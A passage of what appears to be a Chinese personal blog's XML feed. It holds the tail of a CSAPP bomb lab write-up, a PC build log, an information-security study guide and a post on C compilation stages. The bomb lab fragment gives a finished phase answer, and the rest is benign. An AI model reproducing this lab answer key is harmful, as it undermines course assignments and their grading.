class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>我们输入的数字将会把结构体进行排序，排序结果最终需要满足的要求是，结构体存储的值必须要从大到小排列，因此我们找出所有的node存储的值即可</p><table><thead><tr><th>结构体编号</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th></tr></thead><tbody><tr><td>储存值</td><td>0xFD</td><td>0x2D5</td><td>0x12D</td><td>0x3E5</td><td>0xD4</td><td>0x1B0</td></tr><tr><td>排序后编号</td><td>5</td><td>2</td><td>4</td><td>1</td><td>6</td><td>3</td></tr></tbody></table><p>4 2 6 3 1 5</p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>装机记录</title>
    <link href="/p/beacb7b3/"/>
    <url>/p/beacb7b3/</url>
    
    <content type="html"><![CDATA[<h1 id="器材选购"><a href="#器材选购" class="headerlink" title="器材选购"></a>器材选购</h1><ul><li>CPU：锐龙5 5600x</li><li>主板：ASUS TUF GAMING B550M-PLUS WIFI II </li><li>显卡：ROG 2080 super </li><li>内存：英睿达 16GB</li><li>ssd：三星980Pro 1TB</li><li>hdd：Dell SATA 7200 4TB</li><li>散热：玄冰400 V</li><li>机箱：先马剑魔k3</li><li>显示器：LG 4k 550UL</li><li>电源：鑫谷全模组750w金牌电源</li></ul><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul><li>螺丝刀大小各一把，梅花口</li><li>手套一只，防止划伤</li></ul><h1 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h1><ul><li>板u<ul><li>按照AM4主板的CPU安装方式，安装CPU</li><li>卸下主板上原装的散热套件</li><li>涂上散热硅脂</li><li>安装上玄冰400 V散热（散热铜管+风扇）。这里要注意玄冰400有好几代，要找对应代、对应主板类型的安装说明</li></ul></li><li>把主板安装到机箱上进行固定</li><li>安装内存条。内存安装优先插2、4槽，然后是1、3槽</li><li>安装m2接口的ssd。注意要先安装螺柱，然后插入ssd，然后用螺丝固定。我在这里先没有安装螺柱，直接插入ssd然后用螺丝固定，发现左右高低不一，踩坑了</li><li>显卡<ul><li>ROG 2080 super太大太重了，因此需要提前计算机箱是不是能放下</li><li>扣掉机箱背面的挡板，给显卡接口处腾出位置</li><li>将显卡卡在主板上的pcie槽，听见 咔 一声说明安装成功<ul><li>这里注意主板上虽然呦两个pcie槽，但是靠近CPU的才是满速的</li></ul></li><li>用螺丝将显卡固定</li></ul></li><li>hdd<ul><li>卸下机箱hdd槽的螺丝，拿出hdd槽，将hdd插入，然后用螺丝将hdd固定在hdd槽中</li><li>将hdd槽放回机箱，然后用螺丝固定在机箱处</li></ul></li><li>接线<ul><li>将主板供电、CPU供电、SATA、显卡等供电线先插好一头，然后插到电源对应的线口处，这里推荐全模组电源，接线比较方便</li><li>注意到机箱自带的开机线（F_PANEL）是很难接的，建议先把那几条线接了再插显卡，不然显卡太大挡住手很难插</li></ul></li><li>电源<ul><li>将电源固定在机箱处，电源的风扇有上下之分，这里需要注意一下，我的是往下的</li><li>此时你的电源有许多线了，要注意理线让机箱内部整齐划一</li></ul></li></ul><h1 id="系统初始化"><a href="#系统初始化" class="headerlink" title="系统初始化"></a>系统初始化</h1><ul><li>装系统。使用U盘 + <a href="https://rufus.ie/zh/">rufus</a>烧个系统进去，然后在BIOS设置一下U盘启动从而安装系统<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gauss">Rufus是一个帮助格式化和创建可启动USB闪存驱动器的工具，如USB钥匙/软盘、记忆棒等。<br><br>在如下场景中会非常有用：<br><br>你需要把一些可引导的ISO格式的镜像（Windows，Linux，UEFI等）创建成USB安装盘的时候<br>你需要使用一个还没有安装操作系统的设备的时候<br>你需要从<span class="hljs-keyword">DOS</span>系统刷写BIOS或者其他固件的时候<br>你需要运行一个底层的工具的时候<br>Rufus 麻雀虽小，五脏俱全，体积虽小，功能全面，提供了一切你所需要的功能。<br></code></pre></td></tr></table></figure></li><li>新主机的驱动都是缺少的，开机之后要安装蓝牙、WiFi等驱动，建议使用鲁大师</li><li>使用neofetch查看系统信息</li></ul><pre><code class="hljs">$ neofetch                                ..,   user@DESKTOP-0MMJKEF                    ....,,:;+ccllll   --------------------      ...,,+:;  cllllllllllllllllll   OS: Windows 10 □□ҵ□□ LTSC x86_64,cclllllllllll  lllllllllllllllllll   Host: ASUSllllllllllllll  lllllllllllllllllll   Kernel: 10.0.19044llllllllllllll  lllllllllllllllllll   Uptime: 2 days, 19 minsllllllllllllll  lllllllllllllllllll   Packages: 2 (scoop)llllllllllllll  lllllllllllllllllll   Shell: bash 5.1.16llllllllllllll  lllllllllllllllllll   Resolution: 3840x2160                                      DE: Aerollllllllllllll  lllllllllllllllllll   Terminal: Windows Terminalllllllllllllll  lllllllllllllllllll   CPU: AMD Ryzen 5 5600X (12) @ 3.700GHzllllllllllllll  lllllllllllllllllll   GPU: Captionllllllllllllll  lllllllllllllllllll   GPU: NVIDIA GeForce RTX 2080 SUPERllllllllllllll  lllllllllllllllllll   GPU`&#39;ccllllllllll  lllllllllllllllllll   Memory: 12267MiB / 16270MiB       `&#39; \*::  :ccllllllllllllllll                       ````&#39;&#39;*::cll                                 ``</code></pre><p>至此，就装机完成了，一次点亮纪念：</p><p><img src="/image/diycomputer.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安徽大学信息安全专业本科生攻略</title>
    <link href="/p/ecbd1625/"/>
    <url>/p/ecbd1625/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity">安徽大学信息安全专业本科生攻略：Github链接</a></p><h1 id="欢迎来到安徽大学信息安全专业"><a href="#欢迎来到安徽大学信息安全专业" class="headerlink" title="欢迎来到安徽大学信息安全专业"></a>欢迎来到安徽大学信息安全专业</h1><p>借用 <a href="https://survivesjtu.gitbook.io/survivesjtumanual/li-zhi-pian/huan-ying-lai-dao-shang-hai-jiao-tong-da-xue">SurviveSJTUManual</a> 的起始章节，<strong>在本repo的开始，我不得不遗憾地告诉大家一个消息：国内绝大部分大学的本科教学，不是濒临崩溃，而是早已崩溃</strong>。</p><p>有些同学思维一直停留在高考结束那一刻，进入大学便止步不前；有些同学缺乏合理详实的学习路线，不断踩坑失去学习CyberSecurity的兴趣；有些同学只会疯狂卷GPA，表面上成为了每门专业课都在90分以上的所谓“优等学生”，但却是个连最基本的安全技能（比如命令行下 <code>gdb</code> 调试、<code>elf</code> 文件分析、缓冲区溢出原理）都不懂的菜鸟，在虚假的 GPA 繁荣背后，是找不到工作与面试碰壁的进退维谷……</p><p>四年如弹指一挥间，我希望我所走过的弯路，后人便不必再走。人人薪尽火传，有一分热，发一分光，就令萤火一般，也可以在黑暗里发一点光，不必等候炬火。</p><p>[toc]</p><h1 id="漏洞分析-amp-逆向工程"><a href="#漏洞分析-amp-逆向工程" class="headerlink" title="漏洞分析 &amp; 逆向工程"></a>漏洞分析 &amp; 逆向工程</h1><p>ym老师的漏洞分析&amp; 逆向工程应该是计科院最硬核的课程（没有之一），很多人反映听不懂这门课程，在 ddl 前一晚通过祖传的实验报告糊弄过去，拿个及格分数就感到万事大吉。但是，请相信，这是我院含金量最高的一门课程，你的付出将会有所回报。</p><p>在做某一lab的攻击之前，你需要搞懂该攻击对应的的知识点。诚然，《计算机安全导论》这本书对于攻击原理的讲解已经足够优秀和详细，但是由于大多数同学并没有Linux基础，因此光看这本书，还是很难理解背后的机理。假设连Linux下gcc的常用命令都不懂，那么直接去做缓冲区溢出实验，这是十分荒唐的。</p><p><strong>一个推荐的学习路线：</strong></p><ul><li><p>安装并使用Linux系统。下面提供几个方案,可以酌情选择使用：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/110128514">使用VMware安装Linux虚拟机</a>。你需要知道如何使用VMware新建虚拟机、使用快照备份等功能、在本机与虚拟机下使用<a href="https://www.kali.org/docs/virtualization/install-vmware-guest-tools/">VMware-tools</a>完成文本与文件的复制粘贴</li><li>使用双系统方案</li><li>使用 <a href="https://docs.microsoft.com/en-us/windows/wsl/install">wsl2</a></li><li>使用云服务器。安装云服务器，可以通过ssh在任何一个主机上连接并使用Linux环境</li><li>使用<a href="https://hub.docker.com/_/ubuntu">docker Linux镜像</a>。docker是一个很火的虚拟化方式，<a href="https://hub.docker.com/_/ubuntu">docker hub上Ubuntu的镜像</a>已经被下载了超过十亿次</li></ul></li><li><p><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/Linux/%E3%80%8A%E9%B8%9F%E5%93%A5%E7%9A%84Linux%E7%A7%81%E6%88%BF%E8%8F%9C-%E5%9F%BA%E7%A1%80%E7%AF%87%E3%80%8B%E7%AC%AC%E5%9B%9B%E7%89%88.pdf">《鸟哥的Linux私房菜》</a></p><ul><li>这本书大而全，适合作为字典查看，比如，你要做环境变量的lab，那么除了《计算机安全导论》这本书外，你需要知道环境变量对应的基本知识点，那么，直接<code>ctrl + f</code>搜索环境变量这部分知识，会让你读《计算机安全导论》轻松很多</li></ul></li><li><p>自学MIT <a href="https://missing-semester-cn.github.io/">《计算机教育中缺失的一课》</a></p><ul><li>该课程列出了一些计算机专业老师不会教但是十分有用（你永远绕不开）的知识，比如shell编程、命令行、Git 版本控制、Vim 的使用等等</li><li>只听这些课程是远远不够的，这门课更像是一个大纲，告诉你哪些是需要额外学习的，为了深入学习某一个章节，比如Vim，你应该学会自己找资料、配置Vim从而熟练掌握</li></ul></li><li><p><a href="https://nju-projectn.github.io/ics-pa-gitbook/ics2021/linux.html">流传自远古时代的OS实验课程网站中的Linux入门教程</a></p><ul><li> 这是一个墙裂推荐的Linux自学教程</li><li> 想做seedlab，学好Linux的基本使用是最基本的，因此我建议在任何的lab开始之前学习好相关基本操作</li></ul></li><li><p>seed-lab配套网站</p><ul><li><a href="https://seedsecuritylabs.org/index.html">seed主页</a></li><li><a href="https://seedsecuritylabs.org/Labs_20.04/">seed实验</a></li><li><a href="https://seedsecuritylabs.org/Labs_20.04/Software/Shellcode/">某一实验具体主页（以Shellcode 为例）</a></li></ul></li><li><p><a href="https://ctf-wiki.org/">ctf-wiki</a></p><ul><li>ym老师的课可以概括为pwn和逆向，该网站包含了几乎ctf所有知识点，进去后点击pwn/reverse发现新世界</li></ul></li><li><p><a href="https://www.anquanke.com/">安全客</a></p><ul><li>一个为广大安全爱好者和安全从业人员提供权威信息发布的漏洞信息、最新的安全资讯、最全的安全知识及精彩的安全活动的极具影响力的一站式安全平台 </li></ul></li><li><p><a href="https://www.freebuf.com/">FreeBuf</a></p><ul><li>国内关注度最高的互联网安全媒体之一</li></ul></li><li><p><a href="https://www.anquanquan.info/">安全圈</a></p><ul><li>信息安全导航网站</li></ul></li></ul><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>为了完成漏洞分析&amp;逆向工程课程的学习，需要懂得一些基本的Linux知识</p><ul><li>熟练掌握Linux基本命令的使用，比如使用<code>man</code>指令查询手册、<code>grep</code>指令匹配模式串、<code>cd</code>、<code>mv</code>、<code>cp</code>、<code>rm </code>、<code>touch</code>、<code>find</code>、<code>mkdir</code>、<code>ls</code>、<code>gcc</code>、<code>objdump</code>等等</li><li>由于Linux源码几乎全是C编写，因此你需要有比较扎实的C语言和数据结构知识，C语言之父所著的<a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80%20.pdf">C程序设计语言</a>是一本极佳的教材</li><li>为了完成例如缓冲区溢出的实验，你需要有扎实的汇编语言知识，详见【汇编语言】章节</li></ul><p><strong>Linux的学习资源推荐：</strong></p><p><strong><a href="https://missing-semester-cn.github.io/">计算机教育中缺失的一课</a></strong></p><ul><li>大学里的计算机课程通常专注于讲授从操作系统到机器学习这些学院派的课程或主题，而对于如何精通工具这一主题则往往会留给学生自行探索</li><li>在这个系列课程中讲授了命令行、强大的文本编辑器的使用、使用版本控制系统提供的多种特性等等，花时间打磨使用这些工具的能力并能够最终熟练地、流畅地使用它们是非常有必要的</li><li>讲座视频可以在<a href="https://www.youtube.com/playlist?list=PLyzOVJj3bHQuloKGG59rS43e29ro7I57J">Youtube</a>上找到</li></ul><p><strong><a href="https://nju-projectn.github.io/ics-pa-gitbook/ics2021/linux.html">流传自远古时代的OS实验课程网站中的Linux入门教程</a></strong></p><ul><li> 这是一个墙裂推荐的Linux自学教程</li><li> 想做seedlab，学好Linux的基本使用是最基本的，因此我建议在任何的lab开始之前学习好相关基本操作</li></ul><p><strong><a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md">命令行的艺术</a></strong></p><ul><li>github上10万+star的项目，源于quora</li><li>帮你打开命令行新世界的大门</li></ul><p><strong><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/index.html"> Linux Tools Quick Tutorial</a></strong></p><ul><li>一个在线的中文Linux教程</li></ul><h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><p>安大操作系统课程的教学（包括国内别的很多学校）是非常落后的。先说课本，基本都是佶屈聱牙的定义和概念，设计到具体代码编写的基本为0，考试题每年都差不多，比如每年必考的银行家算法，几种调度算法，信号机制，硬生生把这门实践要求极强的学科上成了文科——毫不夸张的说，考前背一晚绝对能过。</p><p>一个推荐的学习路线：</p><ul><li><p><a href="https://csapp.cs.cmu.edu/">csapp</a></p><ul><li><p>看完《深入理解计算机系统》，对汇编、C语言、链接、体系结构等有基本了解</p></li><li><p>试着做一下<a href="http://csapp.cs.cmu.edu/3e/labs.html">csapp对应的lab</a>，csapp绝大多数的精华不在于书本，在于lab</p></li></ul></li><li><p><a href="https://pages.cs.wisc.edu/~remzi/OSTEP/">ostep</a></p><ul><li>这可能是最好的os教学书籍，建议在看csapp的同时进行阅读，互相补充</li><li>试着做一下对应的lab，原因同上</li></ul></li></ul><p>至此，你的os水平已经至少超过了99%的同学</p><ul><li><a href="https://pdos.csail.mit.edu/6.828/2018/schedule.html">mit 6.828</a> (进阶选择)<ul><li>跟着官网的schedule走一遍，做对应的lab，研究xv6的源码实现</li><li><a href="https://pdos.csail.mit.edu/6.828/2018/xv6/book-rev11.pdf">xv6</a>是MIT开发的一个类Unix的教学操作系统，源码只有几万行，具有完备的手册和实现</li></ul></li></ul><h1 id="C-语言"><a href="#C-语言" class="headerlink" title="C 语言"></a>C 语言</h1><p>很多同学认为C语言没有学习的必要，但是绝大多数同学有必要回炉重造一遍。</p><p>下面是几个最简单的C语言知识点，可以自测一下：</p><ul><li>试解释以下C语言语句：<ul><li><code>void (*signal(int sig, void (*func)(int)))(int);</code></li><li><code>int (*(*(*pfunc)(int *))[5])(int *)</code></li></ul></li><li>.c文件到可执行文件过程中经历了几个阶段？对这几个阶段的过程(预处理，编译，汇编，链接)分别做简要叙述</li><li>C语言的函数调用栈过程是怎样的？如何构造缓冲区溢出攻击？</li></ul><p>为了实现C语言进阶，下面是几本推荐的经典书籍：</p><ul><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/C%E5%92%8C%E6%8C%87%E9%92%88.pdf">C和指针</a></li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80%20.pdf">C程序设计语言</a></li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/C%E9%99%B7%E9%98%B1%E4%B8%8E%E7%BC%BA%E9%99%B7.pdf">C陷阱与缺陷</a></li><li>程序员的自我修养：链接、装载与库（不要被书名骗了，这是一本C语言进阶书籍，还是比较难的）</li></ul><p>Linux环境下的C语言学习：</p><ul><li><a href="https://docs.huihoo.com/c/linux-c-programming/">Linux C编程一站式学习</a></li><li><a href="https://www.sourceware.org/gdb/">gdb手册</a></li></ul><p>一个推荐的 C 语言 Github 仓库：</p><ul><li><a href="https://github.com/yifengyou/learn-c">不择手段学C，用汇编和体系结构相关知识理解C语言本质，用思维导图理解C语言语法。清清白白学C</a></li></ul><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><p>首先，学校的教材是自编教材，因此质量不敢恭维。其次，学校的汇编教学十分局限，是16位汇编、实模式，且是Intel的汇编语言格式。但是众所周知，苹果自从iPhone5S发布就开始使用64位架构，且除了Intel的汇编格式外还有AT&amp;T这种非常常见的格式。</p><p>综上，总结下来，学校的汇编教学有如下不足：</p><ul><li>只教学16位汇编内容，与当今流行的64位汇编脱节</li><li>只教学Intel格式，更通用的AT&amp;T格式没有教学（Linux下反汇编默认格式就是AT&amp;T格式）</li><li>只教学实模式，没有教学保护模式</li></ul><p>针对以上弊病，下面给出几本书以自学：</p><ul><li>汇编语言 王爽（这本书讲了16位汇编，但是通俗易懂，比学校教材好很多）</li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/tree/master/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80">x86汇编语言_从实模式到保护模式</a></li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/tree/master/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80">琢石成器： Windows环境下32位汇编语言程序设计</a></li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/master/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/Computer-Systems-A-Programmers-Perspective-3rd.pdf">深入理解计算机系统</a></li></ul><h1 id="保研"><a href="#保研" class="headerlink" title="保研"></a>保研</h1><p>有志于读研的同学，可以考虑下保研。安大的保研率还是比较高的，每年都是13%左右。关于详细的保研的信息，比如每年的具体政策（哪些课算在GPA排名内，哪些竞赛可以提升名次等），建议移步学院官网的相关政策文件。</p><p>值得注意的一点是，位列保研名单内，只是说明你具有保研的资格。与具体能推免到哪个学校是无关的。拿到保研资格后，你需要去申请某一个学校的夏令营/预推免，通过夏令营/预推免初筛后，才能参加该校的面试、笔试、机试，倘若这些考核都通过了，才算是被该校录取。</p><p>因此，除了GPA外没有亮眼的竞赛/项目/论文的同学，在夏令营/预推免会很受打击，因为排名仅仅在报名申请的初筛阶段有用，只要通过了夏令营/预推免初筛，GPA排名便完成了它的历史使命，复试是竞赛/项目/论文的比拼，GPA排名在此时没有任何影响。</p><p><strong>保研的关键时间节点：</strong></p><ul><li>夏令营</li><li>预推免</li><li>九推</li></ul><p><strong>保研申请所需材料：</strong></p><ul><li>个人简历</li><li>教授推荐信</li><li>比赛、奖学金、四六级证书</li><li>项目经历</li><li>论文复印件</li></ul><p><strong>想要了解更多，请见：</strong></p><ul><li><a href="https://mubu.com/doc/klyrpL5cCB">保研夏令营申请攻略</a></li><li><a href="https://github.com/richardodliu/CS-BAOYAN/blob/main/%E4%BF%9D%E7%A0%94%E7%BB%8F%E9%AA%8C%E5%B8%96/%E4%BF%9D%E7%A0%94%E7%BB%8F%E9%AA%8C%E8%B4%B4.md">保研经验贴合集</a></li><li><a href="https://github.com/my-style/computer-exemption">计算机类保研准备_1</a></li><li><a href="https://github.com/richardodliu/CS-BAOYAN">计算机类保研准备_2</a></li></ul><h1 id="书籍推荐"><a href="#书籍推荐" class="headerlink" title="书籍推荐"></a>书籍推荐</h1><ul><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/C%E5%92%8C%E6%8C%87%E9%92%88.pdf">C和指针</a></li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80%20.pdf">C程序设计语言</a></li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/C%E9%99%B7%E9%98%B1%E4%B8%8E%E7%BC%BA%E9%99%B7.pdf">C陷阱与缺陷</a></li><li>程序员的自我修养：链接、装载与库（不要被书名骗了，这是一本C语言进阶书籍，还是比较难的）</li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/x86%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80_%E4%BB%8E%E5%AE%9E%E6%A8%A1%E5%BC%8F%E5%88%B0%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F(%E5%AE%8C%E6%95%B4%E6%89%AB%E6%8F%8F%E7%89%88).pdf">x86汇编语言_从实模式到保护模式</a></li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E7%90%A2%E7%9F%B3%E6%88%90%E5%99%A8%EF%BC%9A%20%20Windows%E7%8E%AF%E5%A2%83%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1.pdf">琢石成器： Windows环境下32位汇编语言程序设计</a></li><li>深入理解计算机系统</li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/Linux/%E3%80%8A%E9%B8%9F%E5%93%A5%E7%9A%84Linux%E7%A7%81%E6%88%BF%E8%8F%9C-%E5%9F%BA%E7%A1%80%E7%AF%87%E3%80%8B%E7%AC%AC%E5%9B%9B%E7%89%88.pdf">《鸟哥的Linux私房菜》</a></li></ul><h1 id="自学资源-amp-repo-amp-网站推荐"><a href="#自学资源-amp-repo-amp-网站推荐" class="headerlink" title="自学资源 &amp; repo &amp; 网站推荐"></a>自学资源 &amp; repo &amp; 网站推荐</h1><ul><li><p><a href="https://github.com/PKUFlyingPig/cs-self-learning">北大计算机自学指南</a></p><ul><li>在北大信科专业流传的自学指南，一个供参考的CS学习规划</li><li><blockquote><p>任何有志于自学计算机的朋友都可以参考这本书。如果你已经有了一定的计算机基础，只是对某个特定的领域感兴趣，可以选择性地挑选你感兴趣的内容进行学习。当然，如果你是一个像我当年一样对计算机一无所知的小白，初入大学的校门，我希望这本书能成为你的攻略，让你花最少的时间掌握你所需要的知识和能力。某种程度上，这本书更像是一个根据我的体验来排序的课程搜索引擎，帮助大家足不出户，体验世界顶级名校的计算机优质课程</p></blockquote></li></ul></li><li><p><a href="https://github.com/yifengyou/learn-c">C 语言进阶</a></p><ul><li>不择手段学C，用汇编和体系结构相关知识理解C语言本质，用思维导图理解C语言语法。清清白白学C</li></ul></li><li><p><a href="https://github.com/QSCTech/zju-icicles">浙江大学课程攻略共享计划</a></p><ul><li>包含浙江大学选课攻略、电子版教材、平时作业答案年试卷、复习资料等</li></ul></li><li><p><a href="https://ctf-wiki.org/">ctf-wiki</a></p><ul><li>ym老师的课可以概括为pwn和逆向，该网站包含了几乎ctf所有知识点，进去后点击pwn/reverse发现新世界</li></ul></li><li><p><a href="https://www.anquanke.com/">安全客</a></p><ul><li>一个为广大安全爱好者和安全从业人员提供权威信息发布的漏洞信息、最新的安全资讯、最全的安全知识及精彩的安全活动的极具影响力的一站式安全平台 </li></ul></li><li><p><a href="https://www.freebuf.com/">FreeBuf</a></p><ul><li>国内关注度最高的互联网安全媒体之一</li></ul></li><li><p><a href="https://www.anquanquan.info/">安全圈</a></p><ul><li>信息安全导航网站</li></ul></li></ul><h1 id="课程之外的知识"><a href="#课程之外的知识" class="headerlink" title="课程之外的知识"></a>课程之外的知识</h1><ul><li><a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">提问的智慧</a><ul><li>作为程序员你该如何提问？<ul><li>RTFM（Read The Fucking Manual）你需要学会读手册</li><li>STFW（Search The Fucking Web）你需要学会在Stack Overflow、stack exchange、Google等网站搜索</li></ul></li><li>一些愚蠢的问题？<ul><li>我能在哪找到 X 程序或 X 资源？<ul><li>就在我找到它的地方啊，白痴 —— 搜索引擎的那一头。天哪！难道还有人不会用 Google 吗？</li></ul></li><li>我的 Windows 电脑有问题，你能帮我吗？<ul><li>扔掉微软的垃圾，换个像 Linux 或 BSD 的开源操作系统吧</li></ul></li><li>我在安装 Linux（或者 X ）时有问题，你能帮我吗？<ul><li>回答：不能，我只有亲自在你的电脑上动手才能找到毛病。还是去找你当地的 Linux 使用群组者寻求实际的指导吧（你能在这儿找到用户群组的清单）</li></ul></li></ul></li></ul></li></ul><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h1 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h1><ul><li><a href="https://survivesjtu.gitbook.io/survivesjtumanual/li-zhi-pian/huan-ying-lai-dao-shang-hai-jiao-tong-da-xue">上海交通大学生存指南</a></li><li><a href="https://github.com/PKUanonym/REKCARC-TSC-UHT">清华大学计算机系课程攻略</a></li><li><a href="https://github.com/QSCTech/zju-icicles">浙江大学课程攻略共享计划</a></li><li><a href="https://github.com/lib-pku/libpku">北京大学课程资料整理</a></li><li><a href="https://zhuanlan.zhihu.com/p/447898788">GitHub 开源计算机课程攻略 yyds</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>学习路线</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习路线，安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言：函数接口</title>
    <link href="/p/be75cde9/"/>
    <url>/p/be75cde9/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>C语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言，指针</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>程序的生命周期：从.c文件到二进制文件</title>
    <link href="/p/2e9a027c/"/>
    <url>/p/2e9a027c/</url>
    
    <content type="html"><![CDATA[<h1 id="一个-c文件是如何成为一个可执行二进制文件的？"><a href="#一个-c文件是如何成为一个可执行二进制文件的？" class="headerlink" title="一个.c文件是如何成为一个可执行二进制文件的？"></a>一个.c文件是如何成为一个可执行二进制文件的？</h1><table><thead><tr><th>文件后缀</th><th>被执行过程</th><th>工具</th><th>细节</th></tr></thead><tbody><tr><td>.c</td><td>预处理</td><td>预处理器（cpp，c pre-processor）</td><td>宏替换、头文件展开、注释删除</td></tr><tr><td>.i</td><td>编译</td><td>ccl</td><td>C语言程序转化为汇编语言程序(.s)</td></tr><tr><td>.s</td><td>汇编</td><td>编译器</td><td>汇编语言程序转化可重定位目标文件(.o)</td></tr><tr><td>.o</td><td>链接</td><td>ld（链接器）</td><td>将多个.o文件链接为一个可执行文件</td></tr></tbody></table><p><img src="/image/31h00bitb5.jpg"></p><h1 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h1><p>使用cpp（C 预处理器）完成了：</p><ul><li>将.c文件转化为.i文件<ul><li>在这里.i文件只是一个后缀而已，本质上仍然是文本文件</li></ul></li><li>宏替换</li><li>头文件展开<ul><li>找到#include的文件内容将其插入到.c文件中</li></ul></li><li>注释删除</li></ul><p>将hello.c文件得到的预处理结果重定向到hello.i</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cpp hello.c &gt; hello.i<br></code></pre></td></tr></table></figure><blockquote><p>可以使用man cpp得到预处理器的相关信息</p></blockquote><p>测试代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *msg = <span class="hljs-string">&quot;Hello, world!\n&quot;</span>;<br>    syscall(SYS_write, <span class="hljs-number">1</span>, msg, <span class="hljs-built_in">strlen</span>(msg));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><ul><li>使用编译器将.i文件转换为.s文件</li><li>将C语言文本转换为汇编语言文本(Assembly Code)</li><li>命令：<code> gcc hello.i -S -o hello.s</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 